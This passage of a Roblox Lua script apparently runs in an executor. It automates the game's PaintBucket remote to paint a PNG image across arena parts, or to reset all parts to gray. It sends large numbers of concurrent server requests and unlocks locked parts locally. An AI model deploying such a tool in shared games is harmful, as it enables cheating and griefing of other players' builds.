            local entry = partData[j]
            if entry.color then fireRemote(entry.part, entry.color) end
            if pending >= MAX_CONCURRENT then
                while pending >= MAX_CONCURRENT and not stopRequested do task.wait() end
            end
        end
        local elapsed = os.clock() - startTime
        local rate = (elapsed > 0) and (batchEnd / elapsed) or 0
        statusLabel.Text = string.format("Wave [%s] %d/%d  •  %.0f/s  •  primed %d",
            waveStyle, batchEnd, total, rate, primed)
        task.wait(waveDelay > 0 and waveDelay or nil)
    end

    statusLabel.Text = "Finishing " .. pending .. " requests..."
    while pending > 0 and not stopRequested do task.wait(0.05) end

    local elapsed = os.clock() - startTime
    if stopRequested then
        statusLabel.Text = string.format("STOPPED at %d/%d in %.1fs%s", painted, total, elapsed,
            failed > 0 and (" (" .. failed .. " failed)") or "")
        log(string.format("Paint stopped at %d/%d in %.1fs (%d failed)", painted, total, elapsed, failed), "warn")
    else
        statusLabel.Text = string.format("Done! %d/%d in %.1fs%s%s", painted, total, elapsed,
            primed > 0 and (" [" .. primed .. " primed]") or "",
            failed > 0 and (" (" .. failed .. " failed)") or "")
        log(string.format("Paint complete: %d/%d in %.1fs (%d primed, %d failed)", painted, total, elapsed, primed, failed))
    end
end

local function clearAllStuds(statusLabel, cornerA, cornerB, waveDelay, forceRepaint, waveStyle)
    if isRunning then statusLabel.Text = "Already running — press Stop."; log("Clear aborted — paint already running.", "warn"); return end

    local paintFn, err = findPaintFunction()
    if not paintFn then
        statusLabel.Text = "Paint Bucket not ready: " .. err
        log("Clear aborted: " .. err, "error")
        return
    end

    isRunning = true
    stopRequested = false

    local parts = {}
    if cornerA and cornerB then
        local regionMin = Vector3.new(
            math.min(cornerA.X, cornerB.X), math.min(cornerA.Y, cornerB.Y), math.min(cornerA.Z, cornerB.Z)
        )
        local regionMax = Vector3.new(
            math.max(cornerA.X, cornerB.X), math.max(cornerA.Y, cornerB.Y), math.max(cornerA.Z, cornerB.Z)
        )
        for _, obj in ipairs(workspace:GetDescendants()) do
            if obj:IsA("BasePart") and not obj:IsA("Terrain") and not isPlayerPart(obj) then
                local p = obj.Position
                if p.X >= regionMin.X and p.X <= regionMax.X
                    and p.Y >= regionMin.Y and p.Y <= regionMax.Y
                    and p.Z >= regionMin.Z and p.Z <= regionMax.Z then
                    table.insert(parts, obj)
                end
            end
        end
    else
        for _, obj in ipairs(workspace:GetDescendants()) do
            if obj:IsA("BasePart") and not obj:IsA("Terrain") and not isPlayerPart(obj) then
                table.insert(parts, obj)
            end
        end
    end

    if #parts == 0 then
        statusLabel.Text = "No studs to clear!"
        log("Clear aborted — no studs found.", "warn")
        isRunning = false
        return
    end

    local partData = table.create(#parts)
    for i = 1, #parts do
        partData[i] = {
            part = parts[i],
            u = i / #parts,
            v = 0,
            wave = i / #parts,
            color = LIGHT_GRAY,
        }
    end
    sortByWave(partData, waveStyle)

    local painted, failed, primed, pending = 0, 0, 0, 0
    local total = #partData
    local startTime = os.clock()

    local function fireRemote(part, targetColor)
        pending = pending + 1
        pcall(function()
            if forceRepaint and part.Locked then part.Locked = false end
            part.Color = targetColor
        end)
        task.spawn(function()
            if forceRepaint and colorsMatch(part.Color, targetColor, 0.05) then
                local primer = makePrimer(targetColor)
                pcall(function() paintFn:InvokeServer("PaintPart", { Part = part, Color = primer }) end)
                primed = primed + 1
            end
            local ok = pcall(function()
                paintFn:InvokeServer("PaintPart", { Part = part, Color = targetColor })
            end)
            if ok then painted = painted + 1 else failed = failed + 1 end
            pending = pending - 1
        end)
    end

    statusLabel.Text = string.format("Clearing [%s] %d parts to light gray...", waveStyle, total)
    log("Clear started: " .. total .. " parts to light gray.")

    for i = 1, total, BATCH_SIZE do
        if stopRequested then break end
        local batchEnd = math.min(i + BATCH_SIZE - 1, total)
        for j = i, batchEnd do
            local entry = partData[j]
            if entry.color then fireRemote(entry.part, entry.color) end
            if pending >= MAX_CONCURRENT then
                while pending >= MAX_CONCURRENT and not stopRequested do task.wait() end
            end
        end
        local elapsed = os.clock() - startTime
        local rate = (elapsed > 0) and (batchEnd / elapsed) or 0
        statusLabel.Text = string.format("Clearing %d/%d  •  %.0f/s", batchEnd, total, rate)
        task.wait(waveDelay > 0 and waveDelay or nil)
    end

    statusLabel.Text = "Finishing " .. pending .. " requests..."
    while pending > 0 and not stopRequested do task.wait(0.05) end

    local elapsed = os.clock() - startTime
    if stopRequested then
        statusLabel.Text = string.format("Clear STOPPED at %d/%d in %.1fs", painted, total, elapsed)
        log(string.format("Clear stopped at %d/%d in %.1fs", painted, total, elapsed), "warn")
    else
        statusLabel.Text = string.format("Cleared %d/%d to light gray in %.1fs%s", painted, total, elapsed,
            failed > 0 and (" (" .. failed .. " failed)") or "")
        log(string.format("Clear complete: %d/%d in %.1fs (%d failed)", painted, total, elapsed, failed))
    end

    isRunning = false
end

local function findToolByName(container, name)
    if not container then return nil end
    for _, obj in ipairs(container:GetChildren()) do
        if obj:IsA("Tool") and obj.Name == name then return obj end
    end
    return nil
end

local function giveBucket(statusLabel)
    local character = player.Character
    if not character then
        statusLabel.Text = "No character."
        log("Give aborted — no character.", "warn")
        return
    end

    local backpack = player:FindFirstChild("Backpack")

    local arkenstone =
        findToolByName(character, "The Arkenstone")
        or findToolByName(backpack, "The Arkenstone")

    if arkenstone then
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid:EquipTool(arkenstone)
            statusLabel.Text = "Equipped The Arkenstone"
            log("Equipped The Arkenstone for " .. userInfo(player))
        else
            statusLabel.Text = "No Humanoid — can't equip."
            log("Has The Arkenstone but no Humanoid.", "warn")
        end
        return
    end

    local teamName = player.Team and player.Team.Name or ""
    if teamName == "The chosen" then
        statusLabel.Text = "gear 18474459"
        log("On team The chosen but missing The Arkenstone — gear 18474459")
        return
    end

    statusLabel.Text = "Nothing to give."
    log("Nothing — no Arkenstone and not on The chosen. Team=" .. teamName)
end

local function startPaint(statusLabel, filePath, cornerA, cornerB, waveDelay, forceRepaint, waveStyle, rotation, zoom, panX, panY)
    if isRunning then statusLabel.Text = "Already running — press Stop."; log("Paint aborted — already running.", "warn"); return end
    if not filePath or filePath == "" then statusLabel.Text = "Pick an image first!"; log("Paint aborted — no file.", "warn"); return end
    if not cornerA or not cornerB then statusLabel.Text = "Set both corners first!"; log("Paint aborted — corners not set.", "warn"); return end

    isRunning = true
    stopRequested = false
    statusLabel.Text = "Reading: " .. filePath
    log("Paint initiated: " .. filePath)

    local ok, rawData = pcall(readfile, filePath)
    if not (ok and rawData) then
        statusLabel.Text = "Read failed!"
        log("Paint read failed: " .. filePath, "error")
        isRunning = false
        return
    end
    local decodeOk, imageData = pcall(PNGDecoder.new, rawData)
    if not (decodeOk and imageData) then
        statusLabel.Text = "Decode failed!"
        log("Paint decode failed: " .. tostring(imageData), "error")
        isRunning = false
        return
    end

    log("Image decoded: " .. imageData.Width .. "x" .. imageData.Height)

    local paintOk, err = pcall(paintExistingStuds, imageData, statusLabel, cornerA, cornerB, waveDelay, forceRepaint, waveStyle, rotation, zoom, panX, panY)
    if not paintOk then
        statusLabel.Text = "Paint error!"
        log("Paint error: " .. tostring(err), "error")
    end
    isRunning = false
end

log("Paint engine loaded.")

local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "RectImagePaintUI"
screenGui.ResetOnSpawn = false
screenGui.DisplayOrder = 1
local ok, _ = pcall(function() screenGui.Parent = CoreGui end)
if not ok then screenGui.Parent = player:WaitForChild("PlayerGui") end

local FRAME_HEIGHT = 500
local TITLE_HEIGHT = 28

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 340, 0, FRAME_HEIGHT)
mainFrame.Position = UDim2.new(0.5, -170, 0.4, -250)
mainFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = screenGui
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 8)

local titleBar = Instance.new("Frame")
titleBar.Size = UDim2.new(1, 0, 0, TITLE_HEIGHT)
titleBar.Position = UDim2.new(0, 0, 0, 0)
titleBar.BackgroundTransparency = 1
titleBar.Parent = mainFrame

local titleLabel = Instance.new("TextLabel")
titleLabel.Size = UDim2.new(1, -70, 0, TITLE_HEIGHT)
titleLabel.Position = UDim2.new(0, 8, 0, 0)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = SCRIPT_NAME
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.Font = Enum.Font.SourceSansBold
titleLabel.TextSize = 16
titleLabel.TextXAlignment = Enum.TextXAlignment.Left
titleLabel.Parent = mainFrame

local minBtn = Instance.new("TextButton")
minBtn.Size = UDim2.new(0, 22, 0, 22)
minBtn.Position = UDim2.new(1, -52, 0, 3)
minBtn.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
minBtn.BorderSizePixel = 0
minBtn.Text = "-"
minBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
minBtn.Font = Enum.Font.SourceSansBold
minBtn.TextSize = 18
minBtn.ZIndex = 10
minBtn.Parent = mainFrame
Instance.new("UICorner", minBtn).CornerRadius = UDim.new(0, 4)

local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 22, 0, 22)
closeBtn.Position = UDim2.new(1, -26, 0, 3)
closeBtn.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
closeBtn.BorderSizePixel = 0
closeBtn.Text = "X"
closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
closeBtn.Font = Enum.Font.SourceSansBold
closeBtn.TextSize = 18
closeBtn.ZIndex = 10
closeBtn.Parent = mainFrame
Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 4)

local minimizableChildren = {}

local function addMinimizable(obj)
    table.insert(minimizableChildren, obj)
    return obj
end

local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, -20, 0, 24)
statusLabel.Position = UDim2.new(0, 10, 0, 28)
statusLabel.BackgroundTransparency = 1
statusLabel.Text = "Equip the PaintBucket gear first!"
statusLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
statusLabel.Font = Enum.Font.SourceSansItalic
statusLabel.TextSize = 12
statusLabel.TextWrapped = true
statusLabel.Parent = mainFrame
addMinimizable(statusLabel)

local selectedFile = ""
local cornerA, cornerB = nil, nil
local cornerPartA, cornerPartB = nil, nil
local forceState = true
local awaitingCorner = nil
local currentRotation = 0
local zoomLevel = 1
local panX, panY = 0.5, 0.5

local waveStyles = { "Diagonal", "Rows", "Columns", "Random" }
local waveStyleIdx = 1
local waveStyle = waveStyles[waveStyleIdx]
local mouse = player:GetMouse()

local dropdownBtn = Instance.new("TextButton")
dropdownBtn.Size = UDim2.new(1, -70, 0, 28)
dropdownBtn.Position = UDim2.new(0, 20, 0, 56)
dropdownBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
dropdownBtn.BorderSizePixel = 0
dropdownBtn.Text = "Choose Image... ▼"
dropdownBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
dropdownBtn.Font = Enum.Font.SourceSans
dropdownBtn.TextSize = 14
dropdownBtn.Parent = mainFrame
Instance.new("UICorner", dropdownBtn).CornerRadius = UDim.new(0, 4)
addMinimizable(dropdownBtn)

local refreshBtn = Instance.new("TextButton")
refreshBtn.Size = UDim2.new(0, 30, 0, 28)
refreshBtn.Position = UDim2.new(1, -44, 0, 56)
refreshBtn.BackgroundColor3 = Color3.fromRGB(60, 90, 60)
refreshBtn.BorderSizePixel = 0
refreshBtn.Text = "R"
refreshBtn.TextColor3 = Color3.fromRGB(200, 255, 200)
refreshBtn.Font = Enum.Font.SourceSansBold
refreshBtn.TextSize = 20
refreshBtn.Parent = mainFrame
Instance.new("UICorner", refreshBtn).CornerRadius = UDim.new(0, 4)
addMinimizable(refreshBtn)

local dropdownScroll = Instance.new("ScrollingFrame")
dropdownScroll.Size = UDim2.new(1, -40, 0, 100)
dropdownScroll.Position = UDim2.new(0, 20, 0, 88)
dropdownScroll.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
dropdownScroll.BorderSizePixel = 0
dropdownScroll.Visible = false
dropdownScroll.ZIndex = 5
dropdownScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
dropdownScroll.Parent = mainFrame
Instance.new("UICorner", dropdownScroll).CornerRadius = UDim.new(0, 4)
local scrollListLayout = Instance.new("UIListLayout")
scrollListLayout.SortOrder = Enum.SortOrder.LayoutOrder
scrollListLayout.Parent = dropdownScroll

local speedLabel = Instance.new("TextLabel")
speedLabel.Size = UDim2.new(0, 90, 0, 22)
speedLabel.Position = UDim2.new(0, 20, 0, 90)
speedLabel.BackgroundTransparency = 1
speedLabel.Text = "Wave delay:"
speedLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
speedLabel.Font = Enum.Font.SourceSans
speedLabel.TextSize = 13
speedLabel.TextXAlignment = Enum.TextXAlignment.Left
speedLabel.Parent = mainFrame
addMinimizable(speedLabel)

local speedBox = Instance.new("TextBox")
speedBox.Size = UDim2.new(0, 60, 0, 22)
speedBox.Position = UDim2.new(0, 110, 0, 90)
speedBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
speedBox.BorderSizePixel = 0
speedBox.Text = "0.01"
speedBox.TextColor3 = Color3.fromRGB(255, 255, 255)
speedBox.Font = Enum.Font.SourceSans
speedBox.TextSize = 13
speedBox.Parent = mainFrame
Instance.new("UICorner", speedBox).CornerRadius = UDim.new(0, 4)
addMinimizable(speedBox)

local speedUnit = Instance.new("TextLabel")
speedUnit.Size = UDim2.new(0, 130, 0, 22)
speedUnit.Position = UDim2.new(0, 180, 0, 90)
speedUnit.BackgroundTransparency = 1
speedUnit.Text = "sec between waves"
speedUnit.TextColor3 = Color3.fromRGB(150, 150, 150)
speedUnit.Font = Enum.Font.SourceSans
speedUnit.TextSize = 12
speedUnit.TextXAlignment = Enum.TextXAlignment.Left
speedUnit.Parent = mainFrame
addMinimizable(speedUnit)

local function makeSpeedBtn(text, value, xPos)
    local b = Instance.new("TextButton")
    b.Size = UDim2.new(0, 75, 0, 20)
    b.Position = UDim2.new(0, xPos, 0, 116)
    b.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
    b.BorderSizePixel = 0
    b.Text = text
    b.TextColor3 = Color3.fromRGB(220, 220, 220)
    b.Font = Enum.Font.SourceSans
    b.TextSize = 11
    b.Parent = mainFrame
    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 3)
    b.MouseButton1Click:Connect(function() speedBox.Text = tostring(value) end)
    addMinimizable(b)
end
makeSpeedBtn("Instant", 0, 20)
makeSpeedBtn("Smooth", 0.02, 103)
makeSpeedBtn("Cinematic", 0.05, 186)

local waveBtn = Instance.new("TextButton")
waveBtn.Size = UDim2.new(0, 165, 0, 22)
waveBtn.Position = UDim2.new(0, 20, 0, 142)
waveBtn.BackgroundColor3 = Color3.fromRGB(70, 70, 110)
waveBtn.BorderSizePixel = 0
waveBtn.Text = "Wave: " .. waveStyle
waveBtn.TextColor3 = Color3.fromRGB(220, 220, 255)
waveBtn.Font = Enum.Font.SourceSansBold
waveBtn.TextSize = 12
waveBtn.Parent = mainFrame
Instance.new("UICorner", waveBtn).CornerRadius = UDim.new(0, 4)
addMinimizable(waveBtn)
waveBtn.MouseButton1Click:Connect(function()
    waveStyleIdx = waveStyleIdx % #waveStyles + 1
    waveStyle = waveStyles[waveStyleIdx]
    waveBtn.Text = "Wave: " .. waveStyle
    log("Wave style changed to: " .. waveStyle)
end)

local rotateBtn = Instance.new("TextButton")
rotateBtn.Size = UDim2.new(0, 145, 0, 22)
rotateBtn.Position = UDim2.new(0, 175, 0, 142)
rotateBtn.BackgroundColor3 = Color3.fromRGB(90, 60, 130)
rotateBtn.BorderSizePixel = 0
rotateBtn.Text = "Rotate: 0°"
rotateBtn.TextColor3 = Color3.fromRGB(230, 210, 255)
rotateBtn.Font = Enum.Font.SourceSansBold
rotateBtn.TextSize = 12
rotateBtn.Parent = mainFrame
Instance.new("UICorner", rotateBtn).CornerRadius = UDim.new(0, 4)
addMinimizable(rotateBtn)
rotateBtn.MouseButton1Click:Connect(function()
    currentRotation = (currentRotation + 90) % 360
    rotateBtn.Text = "Rotate: " .. currentRotation .. "°"
    log("Rotation set to " .. currentRotation .. "°")
end)

local ZOOM_STEPS = { 1, 2, 3, 4, 6, 8 }
local zoomIdx = 1

local zoomBtn = Instance.new("TextButton")
zoomBtn.Size = UDim2.new(0, 90, 0, 22)
zoomBtn.Position = UDim2.new(0, 20, 0, 170)
zoomBtn.BackgroundColor3 = Color3.fromRGB(60, 90, 130)
zoomBtn.BorderSizePixel = 0
zoomBtn.Text = "Zoom: 1x"
zoomBtn.TextColor3 = Color3.fromRGB(210, 235, 255)
zoomBtn.Font = Enum.Font.SourceSansBold
zoomBtn.TextSize = 12
zoomBtn.Parent = mainFrame
Instance.new("UICorner", zoomBtn).CornerRadius = UDim.new(0, 4)
addMinimizable(zoomBtn)
zoomBtn.MouseButton1Click:Connect(function()
    zoomIdx = zoomIdx % #ZOOM_STEPS + 1
    zoomLevel = ZOOM_STEPS[zoomIdx]
    zoomBtn.Text = "Zoom: " .. zoomLevel .. "x"
    log("Zoom set to " .. zoomLevel .. "x")
end)

local panXLabel = Instance.new("TextLabel")
panXLabel.Size = UDim2.new(0, 30, 0, 22)
panXLabel.Position = UDim2.new(0, 115, 0, 170)
panXLabel.BackgroundTransparency = 1
panXLabel.Text = "PanX"
panXLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
panXLabel.Font = Enum.Font.SourceSans
panXLabel.TextSize = 11
panXLabel.TextXAlignment = Enum.TextXAlignment.Left
panXLabel.Parent = mainFrame
addMinimizable(panXLabel)

local panXBox = Instance.new("TextBox")
panXBox.Size = UDim2.new(0, 40, 0, 22)
panXBox.Position = UDim2.new(0, 145, 0, 170)
panXBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
panXBox.BorderSizePixel = 0
panXBox.Text = "0.5"
panXBox.TextColor3 = Color3.fromRGB(255, 255, 255)
panXBox.Font = Enum.Font.SourceSans
panXBox.TextSize = 12
panXBox.Parent = mainFrame
Instance.new("UICorner", panXBox).CornerRadius = UDim.new(0, 3)
addMinimizable(panXBox)

local panYLabel = Instance.new("TextLabel")
panYLabel.Size = UDim2.new(0, 30, 0, 22)
panYLabel.Position = UDim2.new(0, 190, 0, 170)
panYLabel.BackgroundTransparency = 1
panYLabel.Text = "PanY"
panYLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
panYLabel.Font = Enum.Font.SourceSans
panYLabel.TextSize = 11
panYLabel.TextXAlignment = Enum.TextXAlignment.Left
panYLabel.Parent = mainFrame
addMinimizable(panYLabel)

local panYBox = Instance.new("TextBox")
panYBox.Size = UDim2.new(0, 40, 0, 22)
panYBox.Position = UDim2.new(0, 220, 0, 170)
panYBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
panYBox.BorderSizePixel = 0
panYBox.Text = "0.5"
panYBox.TextColor3 = Color3.fromRGB(255, 255, 255)
panYBox.Font = Enum.Font.SourceSans
panYBox.TextSize = 12
panYBox.Parent = mainFrame
Instance.new("UICorner", panYBox).CornerRadius = UDim.new(0, 3)
addMinimizable(panYBox)

local panCenterBtn = Instance.new("TextButton")
panCenterBtn.Size = UDim2.new(0, 22, 0, 22)
panCenterBtn.Position = UDim2.new(0, 265, 0, 170)
panCenterBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
panCenterBtn.BorderSizePixel = 0
panCenterBtn.Text = "C"
panCenterBtn.TextColor3 = Color3.fromRGB(220, 220, 220)
panCenterBtn.Font = Enum.Font.SourceSansBold
panCenterBtn.TextSize = 14
panCenterBtn.Parent = mainFrame
Instance.new("UICorner", panCenterBtn).CornerRadius = UDim.new(0, 3)
addMinimizable(panCenterBtn)
panCenterBtn.MouseButton1Click:Connect(function()
    panXBox.Text = "0.5"
    panYBox.Text = "0.5"
    panX, panY = 0.5, 0.5
    log("Pan reset to center.")
end)

local function readPan()
    local x = tonumber(panXBox.Text) or 0.5
    local y = tonumber(panYBox.Text) or 0.5
    panX = math.clamp(x, 0, 1)
    panY = math.clamp(y, 0, 1)
    panXBox.Text = string.format("%.3f", panX)
    panYBox.Text = string.format("%.3f", panY)
end

panXBox.FocusLost:Connect(readPan)
panYBox.FocusLost:Connect(readPan)

local forceBtn = Instance.new("TextButton")
forceBtn.Size = UDim2.new(0, 20, 0, 20)
forceBtn.Position = UDim2.new(0, 20, 0, 198)
forceBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
forceBtn.BorderSizePixel = 0
forceBtn.Text = "X"
forceBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
forceBtn.Font = Enum.Font.SourceSansBold
forceBtn.TextSize = 15
forceBtn.Parent = mainFrame
Instance.new("UICorner", forceBtn).CornerRadius = UDim.new(0, 3)
addMinimizable(forceBtn)

local forceLabel = Instance.new("TextLabel")
forceLabel.Size = UDim2.new(1, -60, 0, 20)
forceLabel.Position = UDim2.new(0, 46, 0, 198)
forceLabel.BackgroundTransparency = 1
forceLabel.Text = "Force Repaint (prime already-painted studs)"
forceLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
forceLabel.Font = Enum.Font.SourceSans
forceLabel.TextSize = 12
forceLabel.TextXAlignment = Enum.TextXAlignment.Left
forceLabel.Parent = mainFrame
addMinimizable(forceLabel)
forceBtn.MouseButton1Click:Connect(function()
    forceState = not forceState
    forceBtn.BackgroundColor3 = forceState and Color3.fromRGB(0, 120, 215) or Color3.fromRGB(60, 60, 60)
    forceBtn.Text = forceState and "X" or ""
    log("Force Repaint: " .. (forceState and "ON" or "OFF"))
end)

local setCornerABtn = Instance.new("TextButton")
setCornerABtn.Size = UDim2.new(0, 145, 0, 26)
setCornerABtn.Position = UDim2.new(0, 20, 0, 224)
setCornerABtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
setCornerABtn.BorderSizePixel = 0
setCornerABtn.Text = "Click Corner A"
setCornerABtn.TextColor3 = Color3.fromRGB(255, 255, 255)
setCornerABtn.Font = Enum.Font.SourceSans
setCornerABtn.TextSize = 12
setCornerABtn.Parent = mainFrame
Instance.new("UICorner", setCornerABtn).CornerRadius = UDim.new(0, 4)
addMinimizable(setCornerABtn)

local setCornerBBtn = Instance.new("TextButton")
setCornerBBtn.Size = UDim2.new(0, 145, 0, 26)
setCornerBBtn.Position = UDim2.new(0, 175, 0, 224)
setCornerBBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
setCornerBBtn.BorderSizePixel = 0
setCornerBBtn.Text = "Click Corner B"
setCornerBBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
setCornerBBtn.Font = Enum.Font.SourceSans
setCornerBBtn.TextSize = 12
setCornerBBtn.Parent = mainFrame
Instance.new("UICorner", setCornerBBtn).CornerRadius = UDim.new(0, 4)
addMinimizable(setCornerBBtn)

local clearCornersBtn = Instance.new("TextButton")
clearCornersBtn.Size = UDim2.new(0, 145, 0, 20)
clearCornersBtn.Position = UDim2.new(0, 20, 0, 256)
clearCornersBtn.BackgroundColor3 = Color3.fromRGB(80, 40, 40)
clearCornersBtn.BorderSizePixel = 0
clearCornersBtn.Text = "Clear Corners"
clearCornersBtn.TextColor3 = Color3.fromRGB(255, 200, 200)
clearCornersBtn.Font = Enum.Font.SourceSans
clearCornersBtn.TextSize = 11
clearCornersBtn.Parent = mainFrame
Instance.new("UICorner", clearCornersBtn).CornerRadius = UDim.new(0, 4)
addMinimizable(clearCornersBtn)

local clearAllBtn = Instance.new("TextButton")
clearAllBtn.Size = UDim2.new(0, 145, 0, 20)
clearAllBtn.Position = UDim2.new(0, 175, 0, 256)
clearAllBtn.BackgroundColor3 = Color3.fromRGB(120, 120, 120)
clearAllBtn.BorderSizePixel = 0
clearAllBtn.Text = "Clear All"
clearAllBtn.TextColor3 = Color3.fromRGB(30, 30, 30)
clearAllBtn.Font = Enum.Font.SourceSansBold
clearAllBtn.TextSize = 11
clearAllBtn.Parent = mainFrame
Instance.new("UICorner", clearAllBtn).CornerRadius = UDim.new(0, 4)
addMinimizable(clearAllBtn)

local equipBtn = Instance.new("TextButton")
equipBtn.Size = UDim2.new(0, 145, 0, 24)
equipBtn.Position = UDim2.new(0, 20, 0, 282)
equipBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 40)
equipBtn.BorderSizePixel = 0
equipBtn.Text = "Equip PaintBucket"
equipBtn.TextColor3 = Color3.fromRGB(255, 255, 200)
equipBtn.Font = Enum.Font.SourceSansBold
equipBtn.TextSize = 11
equipBtn.Parent = mainFrame
Instance.new("UICorner", equipBtn).CornerRadius = UDim.new(0, 4)
addMinimizable(equipBtn)

local testRemoteBtn = Instance.new("TextButton")
testRemoteBtn.Size = UDim2.new(0, 90, 0, 24)
testRemoteBtn.Position = UDim2.new(0, 175, 0, 282)
testRemoteBtn.BackgroundColor3 = Color3.fromRGB(40, 80, 80)
testRemoteBtn.BorderSizePixel = 0
testRemoteBtn.Text = "Test Remote"
testRemoteBtn.TextColor3 = Color3.fromRGB(200, 255, 255)
testRemoteBtn.Font = Enum.Font.SourceSans
testRemoteBtn.TextSize = 11
testRemoteBtn.Parent = mainFrame
Instance.new("UICorner", testRemoteBtn).CornerRadius = UDim.new(0, 4)
addMinimizable(testRemoteBtn)

local giveBucketBtn = Instance.new("TextButton")
giveBucketBtn.Size = UDim2.new(0, 55, 0, 24)
giveBucketBtn.Position = UDim2.new(0, 265, 0, 282)
giveBucketBtn.BackgroundColor3 = Color3.fromRGB(140, 90, 40)
giveBucketBtn.BorderSizePixel = 0
giveBucketBtn.Text = "Give"
giveBucketBtn.TextColor3 = Color3.fromRGB(255, 230, 200)
giveBucketBtn.Font = Enum.Font.SourceSansBold
giveBucketBtn.TextSize = 11
giveBucketBtn.Parent = mainFrame
Instance.new("UICorner", giveBucketBtn).CornerRadius = UDim.new(0, 4)
addMinimizable(giveBucketBtn)

local previewBtn = Instance.new("TextButton")
previewBtn.Size = UDim2.new(1, -40, 0, 30)
previewBtn.Position = UDim2.new(0, 20, 0, 312)
previewBtn.BackgroundColor3 = Color3.fromRGB(120, 90, 30)
previewBtn.BorderSizePixel = 0
previewBtn.Text = "Preview (local only)"
previewBtn.TextColor3 = Color3.fromRGB(255, 240, 200)
previewBtn.Font = Enum.Font.SourceSansBold
previewBtn.TextSize = 14
previewBtn.Parent = mainFrame
Instance.new("UICorner", previewBtn).CornerRadius = UDim.new(0, 4)
addMinimizable(previewBtn)

local paintBtn = Instance.new("TextButton")
paintBtn.Size = UDim2.new(0, 205, 0, 40)
paintBtn.Position = UDim2.new(0, 20, 0, 348)
paintBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
paintBtn.BorderSizePixel = 0
paintBtn.Text = "Paint Arena"
paintBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
paintBtn.Font = Enum.Font.SourceSansBold
paintBtn.TextSize = 16
paintBtn.Parent = mainFrame
Instance.new("UICorner", paintBtn).CornerRadius = UDim.new(0, 4)
addMinimizable(paintBtn)

local stopBtn = Instance.new("TextButton")
stopBtn.Size = UDim2.new(0, 95, 0, 40)
stopBtn.Position = UDim2.new(0, 230, 0, 348)
stopBtn.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
stopBtn.BorderSizePixel = 0
stopBtn.Text = "Stop"
stopBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
stopBtn.Font = Enum.Font.SourceSansBold
stopBtn.TextSize = 15
stopBtn.Parent = mainFrame
Instance.new("UICorner", stopBtn).CornerRadius = UDim.new(0, 4)
addMinimizable(stopBtn)

local hint = Instance.new("TextLabel")
hint.Size = UDim2.new(1, -40, 0, 40)
hint.Position = UDim2.new(0, 20, 0, 394)
hint.BackgroundTransparency = 1
hint.Text = "PNG ONLY. If it doesn't work, convert your image to .png first.\nZoom crops for quality. Clear All resets to light gray."
hint.TextColor3 = Color3.fromRGB(140, 140, 140)
hint.Font = Enum.Font.SourceSans
hint.TextSize = 11
hint.TextXAlignment = Enum.TextXAlignment.Left
hint.TextWrapped = true
hint.Parent = mainFrame
addMinimizable(hint)

log("UI built successfully.")

local isMinimized = false
local expandedHeight = FRAME_HEIGHT
local minimizedHeight = TITLE_HEIGHT + 6

local function setMinimized(state)
    isMinimized = state
    if isMinimized then
        mainFrame.Size = UDim2.new(0, 340, 0, minimizedHeight)
        for _, obj in ipairs(minimizableChildren) do
            if obj and obj.Parent then obj.Visible = false end
        end
        if dropdownScroll then dropdownScroll.Visible = false end
        minBtn.Text = "+"
    else
        mainFrame.Size = UDim2.new(0, 340, 0, expandedHeight)
        for _, obj in ipairs(minimizableChildren) do
            if obj and obj.Parent then obj.Visible = true end
        end
        minBtn.Text = "-"
    end
end

minBtn.MouseButton1Click:Connect(function()
    setMinimized(not isMinimized)
end)

closeBtn.MouseButton1Click:Connect(function()
    if highlightContainer then highlightContainer:Destroy() end
    screenGui:Destroy()
    log("UI closed by user.")
end)

local highlightContainer = Instance.new("Folder")
highlightContainer.Name = "CornerHighlights"
pcall(function() highlightContainer.Parent = CoreGui end)
if not highlightContainer.Parent then
    highlightContainer.Parent = player:WaitForChild("PlayerGui")
end

local highlightA, highlightB = nil, nil
local selectionA, selectionB = nil, nil

local function makeCornerVisual(part, color)
    local h = Instance.new("Highlight")
    h.FillColor = color
    h.OutlineColor = color
    h.FillTransparency = 0.4
    h.OutlineTransparency = 0
    h.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    h.Adornee = part
    h.Parent = highlightContainer

    local sb = Instance.new("SelectionBox")
    sb.Adornee = part
    sb.Color3 = color
    sb.LineThickness = 0.15
